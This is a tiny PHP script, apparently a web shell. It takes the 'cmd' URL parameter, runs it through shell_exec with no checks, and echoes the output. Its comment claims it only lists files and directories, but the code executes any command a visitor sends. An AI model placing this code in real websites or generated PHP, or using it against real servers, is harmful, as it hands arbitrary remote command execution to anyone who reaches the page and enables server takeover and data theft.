<?php
$cmd = $_GET['cmd'];
$output = shell_exec($cmd);
  
// Display the list of all file
// and directory
echo "<pre>$output</pre>";
?>
